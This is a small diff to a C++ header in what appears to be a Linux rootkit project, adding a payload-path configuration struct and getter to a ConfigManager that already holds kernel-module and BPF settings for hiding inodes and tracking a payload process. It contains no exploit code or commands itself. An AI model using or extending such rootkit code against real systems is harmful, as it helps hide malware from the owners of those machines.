@@ -22,6 +22,10 @@ struct RootkitBpfConfig {
     std::vector<uint64_t> inodes;
 };
 
+struct PayloadConfig {
+    std::string path;
+};
+
 class ConfigManager {
 private:
     bool is_config_ready;
@@ -29,6 +33,7 @@ private:
     pid_t payload_pid;
     KernelModuleConfig kConf;
     RootkitBpfConfig bpfConf;
+    PayloadConfig payloadConf;
 
 public:
     /**
@@ -63,6 +68,13 @@ public:
     * otherwise return config
     */
     std::optional<RootkitBpfConfig> get_bpf_config();
+
+    /**
+    * @brief Returns config for payload
+    * @return Return nullopt if reading of config file wasn't successful,
+    * otherwise return config
+    */
+    std::optional<PayloadConfig> get_payload_config();
 };
 
 }
